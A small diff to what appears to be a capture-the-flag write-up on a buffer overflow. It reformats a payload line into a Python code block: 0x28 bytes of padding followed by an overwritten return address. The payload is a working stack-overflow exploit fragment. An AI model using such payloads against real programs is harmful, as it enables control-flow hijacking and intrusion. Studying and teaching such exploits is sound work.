@@ -46,6 +46,7 @@ Therefore, our padding would be `0x28` bytes.
 
 In the end, our playload will be:
 
-    b"A"*0x28 + p64(0x040064d)  
-
+```Python
+b"A"*0x28 + p64(0x040064d)  
+```
 
